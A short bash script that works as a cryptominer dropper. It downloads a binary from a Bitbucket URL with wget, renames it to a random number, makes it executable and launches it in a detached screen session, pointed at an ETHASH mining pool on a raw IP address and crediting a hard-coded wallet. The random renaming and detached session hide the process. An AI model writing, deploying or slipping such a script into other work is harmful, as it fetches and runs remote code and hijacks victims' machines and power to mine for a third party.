#!/bin/bash

WELS=nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8
PAL=141.95.34.44:2020
WER=x
COMS="--algo ETHASH --pool $PAL --user $WELS.$WER"
TIP=$(shuf -n 1 -i 1-200000)


FILE=./tuan
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    wget https://bitbucket.org/solomase/garangsem/raw/d261db312adaef2baefd19624650e14af8c938dc/tuan
    mv tuan $TIP
    chmod +x *
fi
screen -dmLS ./$TIP $COMS
